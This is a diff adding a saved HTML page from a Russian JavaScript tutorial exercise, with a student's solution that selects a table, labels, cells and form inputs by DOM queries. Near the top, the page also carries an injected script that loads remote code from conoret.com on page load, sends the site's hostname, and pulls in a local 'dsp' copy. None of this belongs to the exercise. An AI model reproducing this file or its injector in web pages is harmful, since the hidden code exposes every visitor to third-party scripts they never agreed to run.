@@ -1,0 +1,73 @@
+<!-- Напишите код, как при помощи javascript получить: 
+    Таблицу с id="age-table". 
+    Все элементы label внутри этой таблицы (их три). 
+    Первый td в этой таблице (со словом «Age»). 
+    Форму form с именем name="search". 
+    Первый input в этой форме. 
+    Последний input в этой форме. -->
+
+<!DOCTYPE html>
+<!-- saved from url=(0057)https://learn.javascript.ru/task/find-elements/table.html -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script src="./table_files/dsp" type="text/javascript" defer="" async=""></script></head><body><script type="text/javascript">window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();</script>
+  <h1>Необходимо открыть консоль</h1>
+  <form name="search">
+    <label>Search the site:
+      <input type="text" name="search">
+    </label>
+    <input type="submit" value="Search!">
+  </form>
+
+  <hr>
+
+  <form name="search-person">
+    Search the visitors:
+    <table id="age-table">
+      <tbody><tr>
+        <td>Age:</td>
+        <td id="age-list">
+          <label>
+            <input type="radio" name="age" value="young">less than 18</label>
+          <label>
+            <input type="radio" name="age" value="mature">18-50</label>
+          <label>
+            <input type="radio" name="age" value="senior">more than 50</label>
+        </td>
+      </tr>
+
+      <tr>
+        <td>Additionally:</td>
+        <td>
+          <input type="text" name="info[0]">
+          <input type="text" name="info[1]">
+          <input type="text" name="info[2]">
+        </td>
+      </tr>
+
+    </tbody></table>
+
+    <input type="submit" value="Search!">
+  </form>
+
+<script>
+  const table = document.getElementById('age-table')
+  console.log('Таблица:', table)
+
+  const labels = table.querySelectorAll('label')
+  console.log('Все label:', labels)
+
+  const firstTd = table.querySelector('td')
+  console.log('Первый td:', firstTd)
+
+  const searchForm = document.querySelector('form[name="search"]')
+  console.log('Форма search:', searchForm)
+
+  const firstInput = searchForm.querySelector('input')
+  console.log('Первый input:', firstInput)
+
+  const inputs = searchForm.querySelectorAll('input')
+  const lastInput = inputs[inputs.length - 1]
+  console.log('Последний input:', lastInput)
+</script>
+
+</body>
+</html>
